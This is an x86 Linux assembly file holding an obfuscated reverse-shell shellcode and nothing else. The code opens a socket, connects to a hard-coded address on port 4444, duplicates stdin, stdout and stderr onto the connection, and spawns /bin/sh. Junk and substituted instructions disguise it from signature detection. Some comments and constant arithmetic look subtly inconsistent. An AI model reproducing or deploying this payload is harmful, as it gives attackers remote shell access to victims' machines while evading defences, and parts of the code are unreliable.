global _start

section .text
  _start:
    ; set the frame pointer
    mov   ebp, esp

    ; clear required registers
    ;xor   eax, eax
sub ecx, ecx
sub edx, edx

    ; create sockaddr_in struct
    push  eax
    push  eax             ; [$esp]: 8 bytes of padding
mov eax, 0x1010102
 dec eax
    xor eax, 0xfeffff80
    push eax
    push  word 0x5c11     
    push  word 0x02       ; [$esp]: AF_INET

    ; call socket(domain, type, protocol)
and eax, 0x01010101
and eax, 0x02020202
and ebx, 0x01010101
and ebx, 0x02020202
    mov   ax, 0x167       ; $eax: 0x167 / 359
    mov   bl, 0x02        ; $ebx: AF_INET
mov cl, 0x02
 dec cl
    int   0x80
    mov   ebx, eax        ; $ebx: socket file descriptor

    ; call connect(sockfd, sockaddr, socklen_t)
mov ax, 0x16b
 dec ax
    mov   ecx, esp
    mov   edx, ebp
    sub   edx, esp        ; $ecx: size of the sockaddr struct
    int   0x80

    ; call dup2 to redirect STDIN, STDOUT and STDERR
    xor   ecx, ecx
mov cl, 0x04
 dec cl
    dup:
and eax, 0x01010101
and eax, 0x02020202
mov al, 0x40
 dec al
    dec   ecx
    int   0x80
    inc   ecx
    loop  dup

    ; spawn /bin/sh using execve
    ; $ecx and $edx are 0 at this point
and eax, 0x01010101
and eax, 0x02020202
sub edx, edx
    push  eax
    push  0x68732f2f
    push  0x6e69622f
    mov   ebx, esp        ; [$ebx]: null terminated /bin//sh
    mov   al, 0x0b
    int   0x80